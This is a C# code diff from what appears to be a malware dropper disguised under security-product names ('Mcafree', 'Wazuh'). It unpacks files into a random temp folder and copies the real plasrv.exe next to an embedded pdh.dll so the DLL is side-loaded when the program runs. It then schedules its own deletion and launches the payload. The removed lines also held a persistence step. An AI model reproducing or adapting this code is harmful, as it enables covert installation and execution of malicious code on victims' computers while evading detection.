@@ -6,13 +6,14 @@
             String userProfileDirectory = System.Environment.GetEnvironmentVariable("USERPROFILE");
             String dirToExtract = userProfileDirectory + "\\AppData\\Local\\Temp\\" + myuuidAsString;
             System.IO.Directory.CreateDirectory(dirToExtract);
-            extract("Mcafree", dirToExtract + "\\", "plasrv.exe");
-            extract("Mcafree", dirToExtract + "\\", "pdh.dll");
-            extract("Mcafree", dirToExtract + "\\", "pdh1.dll");
-            persistence(dirToExtract + "\\" + "plasrv.exe");
-            String currentDirectory = Environment.CurrentDirectory + "\\Mcafree.exe";
-            writeToDelete(currentDirectory);
-            Process.Start(dirToExtract + "\\" + "plasrv.exe");
+            String sourceFile = Environment.GetFolderPath(Environment.SpecialFolder.System) +  "\\plasrv.exe"; ;
+            String destinationFile = dirToExtract + "\\" + "plasrv.exe";
+            System.IO.File.Copy(sourceFile, destinationFile, true);
+            extract("Wazuh", dirToExtract + "\\", "pdh.dll");
+            String currentDirectoryFile = System.Reflection.Assembly.GetEntryAssembly().Location;
+            writeToDelete(currentDirectoryFile);
+            Environment.CurrentDirectory = dirToExtract;
+            Process.Start("plasrv.exe");
         }
         private static void extract(string nameSpace, string outDirectory, string resourceName)
         {
